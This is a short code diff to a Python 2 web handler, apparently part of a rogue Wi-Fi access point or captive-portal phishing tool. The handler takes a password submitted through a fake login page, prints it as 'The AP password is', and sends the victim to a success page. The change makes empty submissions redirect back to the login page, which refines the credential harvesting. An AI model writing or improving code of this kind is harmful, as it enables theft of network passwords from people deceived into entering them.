@@ -61,11 +61,15 @@ class login_server(BaseHTTPRequestHandler):
                 environ={'REQUEST_METHOD': 'POST',
                          'CONTENT_TYPE': self.headers['Content-Type'], }
             )
-
-            print "The AP password is: %s" % form["password"].value
-            self.send_response(301)
-            self.send_header('Location','http://10.0.0.1/success')
-            self.end_headers()
+            if form["password"].value:
+                print "The AP password is: %s" % form["password"].value
+                self.send_response(301)
+                self.send_header('Location','http://10.0.0.1/success')
+                self.end_headers()
+            else:
+                self.send_response(301)
+                self.send_header('Location','http://10.0.0.1/index')
+                self.end_headers()
 try:
     # Create a web server and define the handler to manage the
     # incoming request
